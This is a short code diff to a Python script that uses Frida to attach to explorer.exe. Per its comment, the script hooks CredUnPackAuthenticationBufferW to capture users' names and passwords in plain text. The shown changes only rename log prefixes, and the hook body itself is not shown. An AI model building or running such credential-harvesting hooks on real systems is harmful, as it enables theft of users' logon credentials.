@@ -9,9 +9,9 @@ def wait_for():
 
 def hook():
     try:
-        print("[+] Trying To Attach To Explorer")
+        print("[ explorer-hook ] Trying To Attach To Explorer")
         session = frida.attach("explorer.exe")
-        print(f"[+] Attached To Explorer!")
+        print("[ explorer-hook ] Attached To Explorer!")
 
         # We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
         script = session.create_script("""
@@ -47,5 +47,5 @@ def hook():
         sys.stdin.read()
 
     except Exception as e:
-        print("[-] Unhandled exception: " + str(e))
-        print("[-] Continuing...")
+        print("[ explorer-hook ] Unhandled exception: " + str(e))
+        print("[ explorer-hook ] Continuing...")
